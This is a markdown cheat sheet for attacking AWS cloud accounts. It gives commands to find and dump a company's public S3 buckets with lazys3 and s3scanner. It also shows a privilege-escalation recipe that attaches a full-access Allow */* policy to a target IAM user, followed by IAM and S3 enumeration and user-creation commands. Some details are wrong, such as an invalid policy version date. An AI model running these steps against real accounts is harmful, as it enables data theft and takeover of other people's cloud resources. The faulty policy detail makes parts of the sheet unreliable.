## Cloud hacking cheat sheet

### Amazon

#### Install awscli
```sh
pip3 install awscli
```

#### S3 Bucket Enumeration

##### Search for public buckets from a company using lazys3
```sh
ruby lazys3.rb [COMPANY]
```
##### Search for public buckets from a company using s3scanner
```sh
python3 ./s3scanner.py sites.txt
```

##### Dump all open buckets and log both open and closed buckets using s3scanner
```sh
python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt
```

##### Save the file listings of all open buckets to a file using s3scanner
```sh
python ./s3scanner.py --list names.txt
```

#### Escalate IAM User Privileges by Exploiting Misconfigured User Policy
```sh
vim user-policy.json
```

Insert:
```sh
{
    "Version": "2011-09-11",
    "Statement": [
        {

            "Effect": "Allow",

            "Action": "*",

            "Resource": "*"

        }
    ]
}
```

Attach the created policy (user-policy) to the target IAM user’s account:

```sh
aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json

aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
```

#### View user policies
```sh
aws iam list-attached-user-policies --user-name [Target Username]
```

#### List users
```sh
aws iam list-users
```

#### List buckets
```sh
aws s3api list-buckets --query "Buckets[].Name"
```

#### List user policies
```sh
aws iam list-user-policies
```

#### List role policies
```sh
aws iam list-role-policies
```

#### List froup policies
```sh
aws iam list-group-policies
```

#### Create user
```sh
aws iam create-user
```



[<- Back to index](README.md)

---
## License

© 2021 [javierizquierdovera.com](https://javierizquierdovera.com)

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0) ([`LICENSE-APACHE`](LICENSE-APACHE)) or the [MIT license](https://opensource.org/licenses/MIT) ([`LICENSE-MIT`](LICENSE-MIT)), at your option.

`SPDX-License-Identifier: (Apache-2.0 OR MIT)`